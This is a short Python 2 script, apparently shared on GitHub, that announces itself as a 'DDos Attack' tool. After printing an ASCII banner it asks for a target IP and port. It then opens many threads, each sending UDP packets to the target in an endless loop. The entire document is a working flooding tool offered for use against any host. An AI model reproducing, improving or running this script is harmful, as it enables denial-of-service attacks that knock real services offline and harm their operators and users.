#!/usr/bin/python
# This code write by (Ms.nope)
# DDos Attack
from colorama import Fore,init
import time
import os
import sys
import socket
import thread
init()
class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    blue = '\033[33m'
os.system("clear")
print color.green + """
         (     (         )   (                                          
         )\ )  )\ )   ( /(   )\ )     (         )    )               )  
        (()/( (()/(   )\()) (()/(     )\     ( /( ( /(    )       ( /(  
        /(_)) /(_)) ((_)\   /(_)) ((((_)(   )\()))\())( /(   (   )\()) 
         (_))_ (_))_    ((_) (_))    )\ _ )\ (_))/(_))/ )(_))  )\ ((_)\  
         |   \ |   \  / _ \ / __|   (_)_\(_)| |_ | |_ ((_)_  ((_)| |(_) 
         | |) || |) || (_) |\__ \    / _ \  |  _||  _|/ _` |/ _| | / /  
         |___/ |___/  \___/ |___/   /_/ \_\  \__| \__|\__,_|\__| |_\_\  \n""" + color.blue + """
     ----[    This code write by (Ms.nope)   ]---
     -------[ github :""" + color.blue + """ https://github.com/msprogrammer2938/ ]-----------""" + color.End      
web = raw_input("\nEnter Target ip: ")
time.sleep(1)
port = input("\nEnter Target port: ")
victim_ip = socket.gethostbyname(web)
##################################################3
UDP_PORT = port
time.sleep(2)
MESSAGE = "\nstarting DDos Attacking... "
time.sleep(1)
os.system("clear")
print color.red + "=============================================================================\n" + color.End
print"Target IP:", victim_ip
time.sleep(1)
print"\nTarget port:", UDP_PORT
color.red + "=============================================================================\n" + color.End
time.sleep(3)

def dos(i):
	while True:	
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
			print color.green + "\nThe package is sent to: " + color.red + web + color.End

for i in xrange(port):
	try:
	 thread.start_new_thread( dos , ("Thread-"+str(i),) )
	except KeyboardInterrupt:
             print "Exiting... "
             sys.exit(0)
while 1:
  pass
# Thanks For using :)